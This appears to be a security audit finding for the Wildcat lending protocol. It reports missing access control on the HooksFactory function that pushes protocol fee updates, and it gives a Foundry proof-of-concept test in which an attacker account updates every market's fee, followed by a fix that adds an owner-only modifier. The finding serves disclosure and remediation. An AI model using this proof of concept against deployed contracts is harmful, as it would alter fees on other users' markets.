# Vulnerability details

## POC

In the wildcat protocol the archController can update the protocol fee of the hook template in function  `HooksFactory::updateHooksTemplateFees` , but anyone can update the markets (all markets) through `HooksFactory::pushProtocolFeeBipsUpdates` function.

Here's a test to demonstrate the issue:

```solidity

function test_pushProtocolFeeBipsUpdatesAccessControl() external {
    hooksFactory.addHooksTemplate(hooksTemplate, 'template', address(0xfee), address(0), 0, 0);
    archController.registerBorrower(address(this));

    bytes memory constructorArgs = '';
    MockHooks hooksInstance = _validateDeployHooksInstance(hooksTemplate, constructorArgs);

    bytes memory createMarketHooksData = 'o hey this is my createMarketHooksData do u like it';

    DeployMarketInputs memory parameters = DeployMarketInputs({
      asset: address(underlying),
      namePrefix: 'name',
      symbolPrefix: 'symbol',
      maxTotalSupply: type(uint128).max,
      annualInterestBips: 1000,
      delinquencyFeeBips: 1000,
      withdrawalBatchDuration: 10000,
      reserveRatioBips: 10000,
      delinquencyGracePeriod: 10000,
      hooks: EmptyHooksConfig.setHooksAddress(address(hooksInstance))
    });
    address market0 = hooksFactory.deployMarket(
      parameters,
      createMarketHooksData,
      bytes32(uint(1)),
      address(0),
      0
    );
    address market1 = hooksFactory.deployMarket(
      parameters,
      createMarketHooksData,
      bytes32(uint(2)),
      address(0),
      0
    );

    hooksFactory.updateHooksTemplateFees(hooksTemplate, address(0xfee), address(0), 0, 1_000);

    // @audit-info Anyone can call the pushProtocolFeeBipsUpdates
    vm.startPrank(attacker);
    hooksFactory.pushProtocolFeeBipsUpdates(hooksTemplate, 0, 2);
    vm.stopPrank();
    assertEq(WildcatMarket(market0).previousState().protocolFeeBips, 1_000);
    assertEq(WildcatMarket(market1).previousState().protocolFeeBips, 1_000);
  }

  ```

## Impact

Due to the fact that anyone can the protocolFees in the market,A malicious user can update all the markets with the newly set fee ,even markets that are not related. For example we have for markets(A,B,C,D) and only markets three (A,B,C) markets were intended to be updated, but because anyone has access to this function anyone can decide to update all the markets.

## Recommended Mitigation

Ensure that there is an access control check on the function to verify that   `onlyArchControllerOwner` can perform the updates on the ProtocolFeeBips.

```solidity
function pushProtocolFeeBipsUpdates(
    address hooksTemplate,
    uint marketStartIndex, 
    uint marketEndIndex 
  ) public override onlyArchControllerOwner nonReentrant {}
